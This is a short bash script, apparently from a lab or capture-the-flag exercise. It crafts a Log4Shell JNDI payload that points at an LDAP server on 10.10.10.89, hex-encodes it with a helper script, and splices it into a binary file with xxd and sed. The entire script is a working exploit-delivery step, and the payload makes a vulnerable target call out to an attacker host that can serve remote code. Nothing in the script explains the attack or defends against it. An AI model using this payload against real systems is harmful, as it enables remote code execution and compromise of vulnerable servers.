#!/bin/bash

request=$(echo "\${jndi:ldap://10.10.10.89/}")
payload=$(python3 hex.py $request)
xxd ~/tmp/output | sed -e "s/40:.*/40:\ $payload/" | xxd -r| tee output
